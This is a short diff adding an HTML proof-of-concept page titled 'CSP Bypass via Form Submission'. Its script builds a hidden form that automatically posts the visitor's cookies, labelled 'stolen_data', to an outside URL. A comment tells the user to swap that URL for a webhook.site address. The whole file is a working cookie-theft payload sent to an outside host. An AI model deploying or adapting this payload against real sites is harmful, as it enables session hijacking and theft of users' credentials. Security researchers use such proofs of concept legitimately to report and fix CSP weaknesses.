@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSP Exploit PoC</title>
+</head>
+<body>
+    <h2>Proof of Concept: CSP Bypass via Form Submission</h2>
+    <script>
+        var form = document.createElement("form");
+        form.action = "https://github.com/pavans1620/CSP"; // Replace with your webhook.site URL
+        form.method = "POST";
+
+        var input = document.createElement("input");
+        input.type = "hidden";
+        input.name = "stolen_data";
+        input.value = document.cookie; // This will steal the victim's cookies
+
+        form.appendChild(input);
+        document.body.appendChild(form);
+        form.submit();
+    </script>
+</body>
+</html>
